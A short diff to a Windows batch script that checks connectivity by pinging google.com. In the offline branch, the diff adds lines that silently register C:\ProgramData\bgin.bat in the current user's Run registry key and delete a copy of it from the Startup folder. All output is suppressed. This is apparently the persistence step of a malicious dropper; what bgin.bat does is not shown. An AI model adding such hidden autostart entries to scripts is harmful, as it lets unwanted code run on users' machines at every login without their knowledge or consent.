@@ -1,6 +1,8 @@
 @echo off
 ping -n 1 www.google.com >> nul
 if "%errorlevel%" == "0" goto online >> nul
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Bgin" /t REG_SZ /F /D "C:\ProgramData\bgin.bat" >> nul
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat" >> nul
 exit >> nul
 
 :online >> nul
